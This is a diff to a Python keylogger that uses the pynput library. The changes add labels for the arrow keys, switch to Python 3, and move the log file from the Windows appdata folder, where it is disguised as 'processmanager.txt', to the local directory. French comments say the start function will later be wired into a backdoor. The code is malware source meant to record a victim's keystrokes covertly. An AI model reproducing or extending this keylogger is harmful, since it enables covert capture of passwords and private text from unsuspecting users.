@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 
 import pynput.keyboard
 import threading
@@ -15,12 +15,15 @@ def process_keys(key):
 		if key == key.space:
 			log = log + " "
 		elif key == key.up:
-			log = log + ""
+			log = log + "<up>"
 		elif key == key.down:
-			log = log + ""
+			log = log + "<down>"
+		elif key == key.left:
+			log = log + "<left>"
+		elif key == key.right:
+			log = log + "<right>"
 		else:
 			log = log + " !" + str(key)[4:] + "! "
-	#print(log)
 
 def report():
 	global log
@@ -40,6 +43,7 @@ def start():
 		keyboard_listener.join()
 
 log = ""
-path = os.environ["appdata"] + "\\processmanager.txt" #nom du fichier qui sera ds appdata
+# path = os.environ["appdata"] + "\\processmanager.txt" #nom du fichier qui sera ds appdata
+path = "processmanager.txt" #nom du fichier qui sera ds appdata
 
-#start() #on appelle pas les fonctions, elles seront en backdoor plus tard
+# start() #on appelle pas les fonctions, elles seront en backdoor plus tard
